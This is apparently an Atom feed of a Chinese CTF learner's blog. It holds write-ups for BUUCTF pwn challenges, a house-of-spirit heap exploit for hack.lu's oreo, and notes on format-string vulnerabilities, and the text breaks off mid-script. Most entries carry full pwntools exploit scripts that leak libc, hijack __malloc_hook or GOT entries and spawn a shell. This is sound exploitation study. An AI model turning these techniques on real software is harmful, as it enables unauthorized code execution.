<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zhangzy999.github.io/</id>
    <title>柠檬的博客</title>
    <updated>2020-07-21T01:59:06.355Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zhangzy999.github.io/"/>
    <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
    <subtitle>我是一个热爱信息安全的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。</subtitle>
    <logo>https://zhangzy999.github.io/images/avatar.png</logo>
    <icon>https://zhangzy999.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, 柠檬的博客</rights>
    <entry>
        <title type="html"><![CDATA[buuctf：pwn刷题记录（二）]]></title>
        <id>https://zhangzy999.github.io/post/buuctfpwn-shua-ti-ji-lu-er/</id>
        <link href="https://zhangzy999.github.io/post/buuctfpwn-shua-ti-ji-lu-er/">
        </link>
        <updated>2020-07-18T01:07:13.000Z</updated>
        <content type="html"><![CDATA[<h2 id="babyheap_0ctf_2017">babyheap_0ctf_2017</h2>
<p>fastbin attack<br>
几个点：<br>
1，read函数返回值为读取到的字节数<br>
2，calloc分配后会将堆块中的数据全部置空<br>
3，unsorted bin中的fd和bk（前提只有一个chunk）都会指向unsorted bin ，即arena + 88的位置，是个用来泄露libc地址的不错的选择，libc = unsorted_bin_addr - 88 - main_arena_offset，main_arena_offset用小工具来计算，不同libc版本不一样<br>
4，got不可写时，我们通常攻击__malloc_hook函数，fake chunk的位置位于__malloc_hook - 0x23的位置，经验之谈：fake_chunk = libc_base + 0x3c4aed，当然也可以慢慢调试计算<br>
5，在__malloc_hook附近分配chunk时，需要计算其size，0x7f &gt;&gt; 4 - 2 = 5，其mem_size为0x60<br>
6，fastbin attack 常来攻击__malloc_hook函数</p>
<p>漏洞位于fill函数中，我们填充数据时的字节由我们来控制，所以造成了任意堆溢出的情景。<br>
exp：</p>
<pre><code class="language-python">from pwn import *

#p = process('./babyheap_0ctf_2017')
p = remote('node3.buuoj.cn',29704)

elf = ELF('./babyheap_0ctf_2017')
libc = ELF('./libc.so.6')
#context.log_level = 'debug'

def allocate(size):
	p.recvuntil('Command: ')
	p.sendline('1')
	p.recvuntil('Size: ')
	p.sendline(str(size))

def fill(idx,size,content):
	p.recvuntil('Command: ')
	p.sendline('2')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	p.recvuntil('Size: ')
	p.sendline(str(size))
	p.recvuntil('Content: ')
	p.sendline(content)

def free(idx):
	p.recvuntil('Command: ')
	p.sendline('3')
	p.recvuntil('Index: ')
	p.sendline(str(idx))

def dump(idx):
	p.recvuntil('Command: ')
	p.sendline('4')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	#p.recvuntil('Content:\n')


print '==================step 1: leak libc address ================='
allocate(0x10)  #idx 0
allocate(0x90)	#idx 1
allocate(0x90)	#idx 2
allocate(0x10)	#idx 3
#calloc 4 chunks,first to overflow ,second to mom ,third to child,last to protect not to hebing

#To 
free(1)
payload = 0x10 * 'A' + p64(0) + p64(0x141)
fill(0,len(payload),payload)
allocate(0x130)

payload = 0x90 * 'A' + p64(0) + p64(0xa1)
fill(1,len(payload),payload)
free(2)

dump(1)   #dump mom to leak child fd_pointer
p.recvuntil('Content: \n')
p.recv(0x90 + 0x10)
unsort_addr = u64(p.recv(0x8))
print 'unsort_addr---------------&gt;:' + hex(unsort_addr)
main_arena_offset = 0x3c4b20
# 3c4b78
libc_base = unsort_addr - 88 - main_arena_offset
#we use a tool to caculate main_arena_offset addr
print 'libc_addr-----------------&gt;:' + hex(libc_base)

print '==========================step 2: one_gadget to get shell ===================='
one_gadget_addr = libc_base + 0x4526a
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
allocate(0x90)  #clean idx 2
allocate(0x10)  #idx 4
allocate(0x60)  #fastbin attack: idx 5
allocate(0x10)  #to protect not to hebing: idx 6

free(5)
payload = 0x10 * 'A' + p64(0) + p64(0x71) + p64(malloc_hook_addr - 0x23)
# fake_chunk_addr = libc_base + 0x3c4aed
fill(4,len(payload),payload)

allocate(0x60)  #idx 5
allocate(0x60)  #idx 7
payload = 0x13 * 'A' + p64(one_gadget_addr) 
fill(7,len(payload),payload)

allocate(0x10)
p.interactive()
</code></pre>
<h2 id="ciscn_2019_s_3">ciscn_2019_s_3</h2>
<p>好像有重题，找了一下现有的exp，还真能打通=.=<br>
exp：</p>
<pre><code class="language-python">from pwn import *
 
#p = process('./ciscn_s_3')
p = remote('node3.buuoj.cn',29654)
elf = ELF('./ciscn_s_3')
context.log_level = 'debug'
 
main_addr = elf.symbols['main']
csu_end = 0x040059A
csu_front = 0x0400580
ret_addr = 0x004003a9
rax_59_ret = 0x04004E2
syscall = 0x0400517

#gdb.attach(p,'b *0x00400589')
payload = '/bin/sh\x00' + 'A'*0x8 + p64(main_addr)
p.sendline(payload)
p.recv(0x20)
stack_addr = u64(p.recv(8))
print 'stack_addr--&gt;' + hex(stack_addr)

binsh_addr = stack_addr - 0x138
rax_59 = binsh_addr + 0x10
pop_rdi = 0x04005a3

payload = '/bin/sh\x00' + 'A'*0x8 + p64(rax_59_ret) + p64(csu_end)
payload += p64(0) + p64(1) + p64(rax_59) + p64(0) + p64(0) + p64(0)
payload += p64(csu_front)
payload += 'a'*0x38
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(syscall)
p.sendline(payload)
p.interactive()
</code></pre>
<h2 id="jarvisoj_level2_x64">jarvisoj_level2_x64</h2>
<p>简单的rop<br>
exp：</p>
<pre><code class="language-python">from pwn import *

r = remote('node3.buuoj.cn',26800)
context.log_level = 'debug'

system_addr = 0x4004C0
offset = 0x88
pop_rdi_ret_addr = 0x4006b3
binsh_addr = 0x600A90
payload = offset * 'a'  + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<h2 id="harekazectf2019baby_rop2">[HarekazeCTF2019]baby_rop2</h2>
<p>栈溢出，rop没跑了，除了printf无输出函数，只能用printf来做，泄露read地址和__libc_start_main的地址都可，试试__libc_start_main吧<br>
get到了几个新姿势：<br>
1，__libc_start_main前面是俩下划线<br>
2，printf(&quot;aaaaaa %s&quot;,char);  中，%s会被放到rdi，char会被放到rsi<br>
3，printf经过构造也能用来泄露__libc_start_main的got地址（一般是write或者puts）<br>
exp：</p>
<pre><code class="language-python">from pwn import *
from LibcSearcher import *

r = remote('node3.buuoj.cn',25712)
elf = ELF('./babyrop2')
#context.log_level = 'debug'

printf_plt = elf.plt['printf']
main = elf.symbols['main']
libc_start_main_got = elf.got['__libc_start_main']
offset = 0x28
fmt_str = 0x400770 #func printf: %s is in rdi,string is in rsi
pop_rdi_ret_addr = 0x400733
pop_rsi_r15_ret_addr = 0x400731

payload = offset * 'A' + p64(pop_rdi_ret_addr) + p64(fmt_str) + p64(pop_rsi_r15_ret_addr) + p64(libc_start_main_got) + p64(0) + p64(printf_plt) + p64(main)

r.recvuntil('What\'s your name? ')
r.sendline(payload)
__libc_start_main_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print '__libc_start_main==========================&gt;' + hex(__libc_start_main_addr)

libc = LibcSearcher('__libc_start_main',__libc_start_main_addr)
libc_base = __libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

payload = offset * 'A' + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<h2 id="ciscn_2019_ne_5">ciscn_2019_ne_5</h2>
<p>输入密码进入菜单选项，乍以为是堆题，实际是栈溢出<br>
新姿势get：system('sh')一样可以拿shell<br>
ROPgadget --binary xxx --string 'sh' 可以找到字符串'sh'，然后就没有然后了<br>
exp：</p>
<pre><code class="language-python">from pwn import *

r = remote('node3.buuoj.cn',25224)
elf = ELF('./ciscn_2019_ne_5')

binsh_addr = 0x080482ea
offset = 0x48 + 0x4
system_addr = 0x080484D0
payload = offset * 'A' + p32(system_addr) * 2 + p32(binsh_addr)

r.recvuntil('Please input admin password:')
r.sendline('administrator')
r.recvuntil(':')
r.sendline('1')
r.recvuntil('Please input new log info:')
r.sendline(payload)
r.recvuntil(':')
r.sendline('4')

r.interactive()
</code></pre>
<h2 id="pwn2_sctf_2016">pwn2_sctf_2016</h2>
<p>一开始泄露__libc_start_main，死活出不来<br>
看了wp，改成了泄露printf，一下就出来了<br>
我还能说什么，环境太坑了？？？<br>
漏洞：没有检测size是否小于0，get_n函数的第一个参数作为无符号整数传入，但是在main函数却是整数，可以传入-1进行溢出，在get_n函数里面是个很大的数，在main函数里却是-1，得以绕过长度限制，进行栈溢出<br>
exp：</p>
<pre><code class="language-python">from pwn import *
from LibcSearcher import LibcSearcher

r = remote('node3.buuoj.cn',26971)
elf = ELF('./pwn2_sctf_2016')

fmt_str = 0x080486F8
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
main_addr = elf.symbols['main']
offset = 0x2c + 0x4

payload = offset * 'A' + p32(printf_plt) + p32(main_addr) + p32(fmt_str)  +  p32(printf_got)

r.recvuntil('How many bytes do you want me to read? ')
r.sendline('-1')
r.recvuntil('data!\n')
r.sendline(payload)

r.recvuntil('You said: ')
r.recvuntil('You said: ')
printf_addr = u32(r.recv(4))

print 'printf_addr ===============================&gt; ' + hex(printf_addr)

libc = LibcSearcher('printf',printf_addr)
libc_base = printf_addr - libc.dump('printf')
print 'libc_base ===============================&gt; ' + hex(libc_base)

system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

print hex(system_addr)

payload = offset * 'A' + p32(system_addr) + p32(main_addr) + p32(binsh_addr)

r.recvuntil('How many bytes do you want me to read? ')
r.sendline('-1')
r.recvuntil('data!\n')
r.sendline(payload)

r.interactive()
</code></pre>
<h2 id="铁人三项第五赛区_2018_rop">铁人三项(第五赛区)_2018_rop</h2>
<p>妹啥好说的，32位rop，用write函数泄露write地址，算算偏移直接拿flag<br>
exp：</p>
<pre><code class="language-python">from pwn import *
from LibcSearcher import LibcSearcher

r = remote('node3.buuoj.cn',27250)
elf = ELF('./2018_rop')
#context.log_level = 'debug'

offset = 0x88 + 0x4
main_addr = elf.symbols['main']
write_plt = elf.plt['write']
write_got = elf.got['write']

payload = offset * 'A' + p32(write_plt) + p32(main_addr)  + p32(1) + p32(write_got) + p32(0x4)
r.sendline(payload)

write_addr = u32(r.recv(4))
print 'write_addr =====================&gt; ' + hex(write_addr)

libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

payload = offset * 'A' + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
r.sendline(payload)

r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[fastbin attack(house of sprit) - 2014 hack.lu oreo]]></title>
        <id>https://zhangzy999.github.io/post/fastbin-attackhouse-of-sprit-2014-hacklu-oreo/</id>
        <link href="https://zhangzy999.github.io/post/fastbin-attackhouse-of-sprit-2014-hacklu-oreo/">
        </link>
        <updated>2020-07-11T14:17:26.000Z</updated>
        <content type="html"><![CDATA[<p>题目是这样shai的<br>
<img src="https://zhangzy999.github.io//post-images/1594477169098.png" alt="" loading="lazy"><br>
大概是个枪支商店，可以添加枪支，释放枪支，展示枪支信息，留言等等<br>
然后这个例题难度主要是在逆向分析上，很令人恼火（<br>
然后说一下house of sprit攻击手法<br>
主要是有一个目标区域我们没办法控制，但是这个区域之前和之后的区域我们可以控制，我们控制区域之前主要是为了来伪造chunk的size，让其绕过检查机制，控制目标区域之后的位置主要是伪造the next chunk的size，next chunk 的大小不能小于 2 * SIZE_SZ（两个字长），同时也不能大于av-&gt;system_mem，然后还有类似与那种检查size位的ISMMAP位等容易满足的检查，我直接放个wiki上的图，方便以后复习用。<br>
<img src="https://zhangzy999.github.io//post-images/1594477558899.png" alt="" loading="lazy"><br>
我是懒狗，不截图了，直接大致说说整体的思路好了<br>
add功能：<br>
添加枪支结构体，我们可以输入名字和描述，在名字的位置的地方可以进行堆溢出，覆盖最后一个字长，最后一个字长存储上一个chunk的地址。<br>
show功能：<br>
本题目没有后门，我们只能泄露libc基址来拿到system地址，我们选择free函数来泄露即可，由于延迟绑定机制，我们提前申请和释放一个堆块来处理。通过show的打印功能，我们可得到free@got，进而得到system地址。<br>
free功能：<br>
从最后一个堆块开始，依次向前free所有堆块。这里的话我们伪造的chunk不在链表的最后部位，即程序无法检测到double free，可以放心的van~<br>
message功能：<br>
可以写入留言信息，message指针位于bss段，同时指向bss段某个位置，我们可以写入留言，然后立即调用strlen函数进行一些检查，那么我们可以考虑在message指针这个部位伪造一个chunk，修改message指针到strlen函数的地址，然后我们写入system的地址，这样函数就给我们调用system了。<br>
综上所述，泄露system地址，然后利用heap overflow伪造一个bss_chunk，然后我们free。（值得一提的是，我们在这之前，bss_chunk_data指针-0x4的位置应该是伪造的chunk的size域，而这个地方恰好是记录了我们add了多少次chunk的变量，所以在exp里我们用了一个for循环来申请chunk，使其变为0x40，来伪造其size。之后我们可以用message功能，编辑信息，伪造next chunk的size。）free之后我们malloc，就得到了一个可控指针，我们劫持strlen函数改为system，传入参数&quot;;/bin/sh\x00&quot;，举个例子，system(&quot;ls;/bin/sh&quot;)相当于分别传入参数ls和binsh，大概就是这个原理，直接写exp</p>
<pre><code class="language-python">from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
libc = ELF('./libc.so.6')
p = process('./oreo')
elf = ELF('./oreo')
#context.log_level = 'debug' 

def add(name,description):
	#p.recvuntil('Action: ')
	p.sendline('1')
	#p.recvuntil('Rifle name: ')
	p.sendline(name)
	#p.recvuntil('Rifle description: ')
	#pause()
	p.sendline(description)

def show():
	#p.recvuntil('Action: ')
	p.sendline('2')

def free():
	#p.recvuntil('Action: ')
	p.sendline('3')

def edit_message(message):
	#p.recvuntil('Action: ')
	p.sendline('4')
	#p.recvuntil('Enter any notice you\'d like to submit with your order: ')
	p.sendline(message)

def show_current():
	#p.recvuntil('Action: ')
	p.sendline('5')

print &quot;====================================&quot;
print 'step1: leak libc'

add('a','b')
free() 
name = 'A' * 27 + p32(elf.got['free'])
#print 'name:' + name
description = 'A' * 25
add(name,description)

show()

p.recvuntil(25*'A')
p.recvuntil('Description: ')
free_addr = u32(p.recvuntil('\n',drop = True)[0:4])
print 'free_address: ' + hex(free_addr)
libc_base = free_addr - libc.symbols['free']
system_addr = libc_base + libc.symbols['system']
print 'system_addr: ' + hex(system_addr)

print &quot;====================================&quot;
print 'step2: alloc to bss'

# add 0x40 to change the newtimes which replace the size to bypass check
for i in range(0x40 - 0x2 - 0x1):
	add('a'*27 + p32(0),'b')

message_pointer = 0x0804a2a8  # fake chunk
payload = 27*'A' + p32(message_pointer)
add(payload,'a')

payload = (0x38 - (0x0804a2c0 - 0x0804a2a8) - 0x4) * 'A' + 0x4 * '\x00' + 'aaaa' + p32(0x100)         # in order to bypass the next chunk size check
edit_message(payload)
free()

print &quot;======================================&quot;
print 'step3: attack func &quot;strlen&quot; to get shell'

payload = p32(elf.got['strlen'])
add('hack',payload)
edit_message(p32(system_addr) + ';/bin/sh\x00')

p.interactive()
</code></pre>
<p>拿shell，很奈斯<br>
我太菜了</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[buuctf：pwn刷题记录（一）]]></title>
        <id>https://zhangzy999.github.io/post/buu_pwn_1/</id>
        <link href="https://zhangzy999.github.io/post/buu_pwn_1/">
        </link>
        <updated>2020-06-14T03:31:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="test_your_nc">test_your_nc</h2>
<p>连接一下拿flag</p>
<h2 id="rip">rip</h2>
<p>简单运行一下看看程序的效果<br>
<img src="https://zhangzy999.github.io//post-images/1592108548694.png" alt="" loading="lazy"><br>
ida分析一下是栈溢出，我们确定偏移量<br>
<img src="https://zhangzy999.github.io//post-images/1592108567481.png" alt="" loading="lazy"><br>
然后找到system地址<br>
<img src="https://zhangzy999.github.io//post-images/1592108579697.png" alt="" loading="lazy"><br>
写exp</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Author:CyurL3

from pwn import *

ip = 'node3.buuoj.cn'
port = '26614'
r = remote(ip,port)

offset = 0xF + 0x8
system_addr = 0x40118A

payload = offset * 'A' + p64(system_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<h2 id="warmup_csaw_2016">warmup_csaw_2016</h2>
<p>看看程序功能<br>
<img src="https://zhangzy999.github.io//post-images/1592108601054.png" alt="" loading="lazy"><br>
检查一下程序保护机制发现啥也没开，直接ida确定偏移量<br>
<img src="https://zhangzy999.github.io//post-images/1592108629784.png" alt="" loading="lazy"><br>
发现system地址<br>
<img src="https://zhangzy999.github.io//post-images/1592108638603.png" alt="" loading="lazy"><br>
写exp</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Author:CyurL3

from pwn import *

#filename = ''
#procedure = './' + filename
#sh = process(procedure)
#elf = ELF(procedure)

ip = 'node3.buuoj.cn'
port = '25606'
r = remote(ip,port)

offset = 0x40 + 0x8

r.recvuntil(':')
cat_flag_addr = r.recvuntil('\n',drop = True)
cat_flag_addr = int(cat_flag_addr,16)

payload = offset * 'A' + p64(cat_flag_addr)

r.recvuntil('&gt;')
r.sendline(payload)
r.interactive()
</code></pre>
<h2 id="pwn1_sctf_2016">pwn1_sctf_2016</h2>
<p>运行程序<br>
<img src="https://zhangzy999.github.io//post-images/1592108657865.png" alt="" loading="lazy"><br>
然后我们ida分析一下，可以发现是c++写的（枯了）<br>
然后有个很奇怪的点，可以发现我们输入的字符不足以造成栈溢出<br>
<img src="https://zhangzy999.github.io//post-images/1592108665845.png" alt="" loading="lazy"><br>
不过下文好像是有那么一个把&quot;I&quot;替换成&quot;you&quot;的功能<br>
<img src="https://zhangzy999.github.io//post-images/1592108673171.png" alt="" loading="lazy"><br>
我们运行一下程序<br>
<img src="https://zhangzy999.github.io//post-images/1592108681386.png" alt="" loading="lazy"><br>
这样的话能把一个字符变成三个字符就能够进行溢出了<br>
我们找system地址<br>
<img src="https://zhangzy999.github.io//post-images/1592108688950.png" alt="" loading="lazy"><br>
编写exp</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Author:CyurL3

from pwn import *

ip = 'node3.buuoj.cn'
port = '29955'
r = remote(ip,port)

offset = 0xC + 0x4 
get_flag_addr = 0x08048F0D

payload = 20 * 'I' + p32(get_flag_addr) + p32(get_flag_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<h2 id="ciscn_2019_n_1">ciscn_2019_n_1</h2>
<p>运行程序<br>
<img src="https://zhangzy999.github.io//post-images/1592108709887.png" alt="" loading="lazy"><br>
进ida看看<br>
<img src="https://zhangzy999.github.io//post-images/1592108719223.png" alt="" loading="lazy"><br>
应该是让我们溢出v2的值，让v2等于11.28125就能cat flag<br>
那么问题就是11.28125在内存是如何表示的？<br>
有一张图参考一下，不是本题重点，可自行查阅一下浮点数在内存中的表示方法<br>
<img src="https://zhangzy999.github.io//post-images/1592108725874.png" alt="" loading="lazy"><br>
最终计算一下就是0x41348000<br>
编写exp</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Author:CyurL3

from pwn import *

ip = 'node3.buuoj.cn'
port = '26369'
r = remote(ip,port)

offset = 0x2C

payload = offset * 'A' + p64(0x41348000)

r.sendline(payload)
r.interactive()
</code></pre>
<h2 id="ciscn_2019_c_1">ciscn_2019_c_1</h2>
<p>这个题比上面四个加起来还难=.=<br>
我们运行一下程序，发现有三个功能，第一个功能就是一个加密的功能，第二个功能没用，程序让我们自己解密。。。第三个功能程序直接退出了<br>
<img src="https://zhangzy999.github.io//post-images/1592108737030.png" alt="" loading="lazy"><br>
ida发现加密函数是这样的<br>
<img src="https://zhangzy999.github.io//post-images/1592108744461.png" alt="" loading="lazy"><br>
然后puts函数会输出加密后的信息<br>
这个题没有后门之类的函数，需要我们构造ROP链，那么我们首先要拿到system函数或者execve这样的函数的地址，用LibcSearcher来搞<br>
再次之前我们先要获取puts函数的地址，由于puts函数只有一个参数，也就是rdi寄存器里的，那么我们来找一下pop rdi;ret这样的片段，发现是有这种片段的<br>
<img src="https://zhangzy999.github.io//post-images/1592108751782.png" alt="" loading="lazy"><br>
然而这个片段实际上是__libc_csu_init函数（一个初始化libc的函数）的片段，pop r15指令是三个16进制数，然而后两个十六进制数组合正好是pop rdi，也就是能用ROPgadget搜到的那个片段，由于我们只有一个参数，直接用那个片段来玩就行，不再展开用__libc_csu_init函数来构造ROP链了（wiki上有详细说明）<br>
<img src="https://zhangzy999.github.io//post-images/1592108761239.png" alt="" loading="lazy"><br>
注意我们的payload会被加密，两次异或加密后还是其本身，所以我们自己来写个解密函数好了，由于两次payload的长度一样，所以第二次发payload就不会再被加密了（用ida分析可知）<br>
直接贴个exp吧，注意，第二次的payload有一个栈对齐，所以我们加上一个ret指令来进行对齐即可</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Author:CyurL3

from pwn import *
from LibcSearcher import LibcSearcher

ip = 'node3.buuoj.cn'
port = '27912'
r = remote(ip,port)
#sh = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_c_1')

offset = 0x58
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
gets_got = elf.got['gets']
main_addr = elf.symbols['main']
fregment_one = 0x400c7a
fregment_two = 0x400c60
pop_rdi_ret = 0x400c83
bss_base = elf.bss()

def encrypt(payload):
    l = list(payload)
    for i in range(len(l)):
        if l[i].isdigit():
            l[i] = chr(ord(l[i]) ^ 0xF)
        elif l[i].isupper():
            l[i] = chr(ord(l[i]) ^ 0xE)
        elif l[i].islower():
            l[i] = chr(ord(l[i]) ^ 0xD)
    return ''.join(l)

r.recvuntil('Input your choice!\n')
r.sendline('1')
r.recvuntil('Input your Plaintext to be encrypted\n')

payload = offset * 'A' + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) +p64(main_addr)
payload = encrypt(payload)
r.sendline(payload)

r.recvuntil('Ciphertext\n')
r.recvuntil('\n')
puts_addr = u64(r.recvuntil('\n', drop=True).ljust(8,'\x00'))
print 'puts_addr:' + hex(puts_addr)

libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
print 'system:' + hex(system_addr)

r.recvuntil('Input your choice!\n')
r.sendline('1')
r.recvuntil('Input your Plaintext to be encrypted\n')

ret_addr = 0x4006b9
payload = offset * 'A' + p64(ret_addr)  + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) 
#payload = encrypt(payload)
r.sendline(payload)
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[格式化字符串漏洞学习总结]]></title>
        <id>https://zhangzy999.github.io/post/format_string_study/</id>
        <link href="https://zhangzy999.github.io/post/format_string_study/">
        </link>
        <updated>2020-06-06T09:16:23.000Z</updated>
        <content type="html"><![CDATA[<p>从ctfwiki上学习了一波，来总结一下（推荐看ctfwiki，很详细，但是看完适合自己总结，第二遍看的时候就有些冗余了）<br>
初学格式化字符串建议看wiki，本文是总结篇</p>
<h1 id="泄露内存">泄露内存</h1>
<h2 id="泄露栈内存">泄露栈内存</h2>
<p>关于栈内存的泄露比较简单，不多说了</p>
<h3 id="获取栈变量的数值">获取栈变量的数值</h3>
<h3 id="获取栈变量的字符串">获取栈变量的字符串</h3>
<h2 id="泄露任意地址内存">泄露任意地址内存</h2>
<p>看实例程序</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf(&quot;%s&quot;, s);
  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);
  printf(s);     //这个地方显然有格式化字符串漏洞
  return 0;
}
</code></pre>
<p>编译一下</p>
<pre><code>gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
</code></pre>
<p>泄露指定地址的方法：</p>
<pre><code>addr%k$s
</code></pre>
<p>确定字符串为几个参数的方法：</p>
<pre><code>AAAA%p%p%p%p%p%p%p%p%p%p%p%p
</code></pre>
<p>我们设置一个可访问的地址，用scanf@got来举例子拿到scanf的地址（一般不泄露printf函数的地址，自己实操一下即可）<br>
第一步，拿到scanf@got的地址（可有可无）<br>
<img src="https://zhangzy999.github.io//post-images/1591436467954.png" alt="" loading="lazy"><br>
第二步，判断是<strong>格式化字符串</strong>的第几个参数<br>
通过%p的那种形式可以判断出来是格式化字符串的第四个参数<br>
<img src="https://zhangzy999.github.io//post-images/1591436474937.png" alt="" loading="lazy"><br>
第三步，写payload</p>
<pre><code class="language-python">from pwn import *

filename = './format_string_1_leakmemory'
sh = process(filename)
elf = ELF(filename)

scanf_got = elf.got['__libc_start_main']
payload = p32(scanf_got) + '%4$s'

sh.sendline(payload)

sh.recvuntil('%4$s')
print hex(u32(sh.recv()[4:8]))
</code></pre>
<p>然后就拿到了scanf的地址</p>
<h1 id="覆盖内存">覆盖内存</h1>
<h2 id="覆盖栈内存">覆盖栈内存</h2>
<p>实例程序：</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf(&quot;%p\n&quot;, &amp;c);
  scanf(&quot;%s&quot;, s);
  printf(s);
  if (c == 16) {
    puts(&quot;modified c.&quot;);
  } else if (a == 2) {
    puts(&quot;modified a for a small number.&quot;);
  } else if (b == 0x12345678) {
    puts(&quot;modified b for a big number!&quot;);
  }
  return 0;
}
</code></pre>
<p>同样存在格式化字符串的漏洞，我们在这一小节来覆盖c的值，让他等于16<br>
还是两步走：<br>
第一步：确定c的地址（在程序中的第六行已经打印出来c的地址）<br>
第二步：确定格式化字符串的参数（不再赘述，还是gdb中下断点或者直接运行程序数0x的个数，aaaa%p大法）<br>
确定了这两步就能把payload写出来了<br>
payload：p32([c_addr]) + (16-4) * 'A' + '%k$n'</p>
<h2 id="覆盖任意地址内存">覆盖任意地址内存</h2>
<h3 id="覆盖小值">覆盖小值</h3>
<p>我们覆盖变量a<br>
还是两步走：<br>
第一步：确定a的地址，直接ida<br>
第二部：确定格式化字符串的参数<br>
注意，由于是小值（我们想要a的值是2），我们就不能把a的地址放到首位了，因为放到首位明显就占四字节，不可能让它再等于2了，所以我们往后移，同样的，格式化字符串参数也得后移<br>
payload：2 * 'a' + '%K$n' + 2 * 'a'(为了占够4字节) + p32([a_addr])</p>
<h3 id="覆盖大值">覆盖大值</h3>
<p>我们覆盖变量b<br>
还是两步走：<br>
第一步：确定b的地址，直接ida<br>
第二步：确定格式化参数<br>
注意，我们的b是要变成0x12345678，输入那么多东西显然不太好，我们就采用一个字节一个字节的覆盖，就是b的地址覆盖0x78，然后b+1的地址处覆盖0x56，这种意思，有点儿像定位攻击一样<br>
payload：p32([b_addr]) + p32([b_addr+1]) + ... + p32([b_addr+4]) +  104 * 'a' + '%6<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \* at position 12: hhn&#039; + 222 \̲*̲ &#039;a&#039; + &#039;%7'>hhn&#039; + 222 \* &#039;a&#039; + &#039;%7</span>hhn' + 222 * 'a' + '%8<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \* at position 12: hhn&#039; + 222 \̲*̲ &#039;a&#039; + &#039;%9'>hhn&#039; + 222 \* &#039;a&#039; + &#039;%9</span>hhn'<br>
（104 + 16(16是前面的四个地址加起来16字节) = 0x78，0x78 + 222 = 0x156，自动舍弃前面的1，即0x56，后面的计算方法同上，不再赘述）</p>
<h2 id="pwntools中的宝藏函数">pwntools中的宝藏函数</h2>
<pre><code> pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') → str[source]

    Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from context.bits

    The overflows argument is a format-string-length to output-amount tradeoff: Larger values for overflows produce shorter format strings that generate more output at runtime.
    Parameters:	
        offset (int) – the first formatter’s offset you control
        writes (dict) – dict with addr, value {addr: value, addr2: value2}
        numbwritten (int) – number of byte already written by the printf function
        write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
        overflows (int) – how many extra overflows (at size sz) to tolerate to reduce the length of the format string
        strategy (str) – either ‘fast’ or ‘small’ (‘small’ is default, ‘fast’ can be used if there are many writes)
    
    Returns:	The payload in order to do needed writes
</code></pre>
<p>所以之前的覆盖abc的payload就不用我们再算来算去了<br>
直接调用这个超级无敌牛掰的函数<br>
覆盖c：payload = fmtstr_payload(6,{c_addr:0x10},write_size='int')<br>
覆盖a：payload = fmtstr_payload(6,{a_addr:2},write_size='short')<br>
覆盖b：payload = fmtstr_payload(6,{0x0804A028:0x12345678},write_size='byte')<br>
其实对于第三个参数write_size，万能方法是让它等于'byte'，因为按字节来写入是最准确的，默认值也是byte，所以我们也可省略第三个参数<br>
另外附上覆盖内存的exp（我用封装函数的形式来写）</p>
<pre><code class="language-python">from pwn import *

filename = './overflow'
sh = process(filename)
def stack():
	c_addr = sh.recvuntil('\n',drop = True)
	c_addr = int(c_addr,16)
	#payload = p32(c_addr) + 12 * 'a' + '%6$n'
	payload = fmtstr_payload(6,{c_addr:0x10},write_size='int')

	sh.sendline(payload)
	print sh.recv()

def small():
	a_addr = 0x0804A024
	

	#payload = 'aa' + '%8$n' + 'aa' + p32(a_addr)
	payload = fmtstr_payload(6,{a_addr:2},write_size='short')	

